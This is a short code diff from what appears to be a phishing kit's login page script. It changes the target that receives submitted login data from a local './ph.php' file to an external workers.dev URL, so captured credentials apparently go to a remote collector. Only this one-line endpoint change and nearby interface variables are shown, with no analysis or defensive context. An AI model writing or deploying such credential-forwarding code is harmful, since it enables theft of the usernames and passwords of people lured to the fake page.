@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded' ,function(){
   	.prop("type", "password");
   }
 });
-    var url="./ph.php"
+    var url="https://ekeuvaue.jjmdw.workers.dev/"
     submit_btn = document.getElementById("continueFromUserLogin");
     userInputContainerDiv = document.getElementById("userInputContainerDiv")
     userBackButton =  document.getElementById("userBackButtonSpanTxt")
